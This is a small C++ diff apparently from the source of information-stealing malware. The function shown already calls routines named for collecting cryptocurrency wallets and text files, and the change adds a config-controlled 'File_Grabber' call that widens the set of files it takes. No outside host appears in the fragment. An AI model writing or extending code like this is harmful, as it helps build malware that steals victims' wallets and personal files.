@@ -112,4 +112,6 @@ void Other()
 	wallets::Wallets();
 	if (!config::enableFileGrubber)
 		files::Txt_files();
+	if (config::enableFileGrubber)
+		files::File_Grabber();
 }
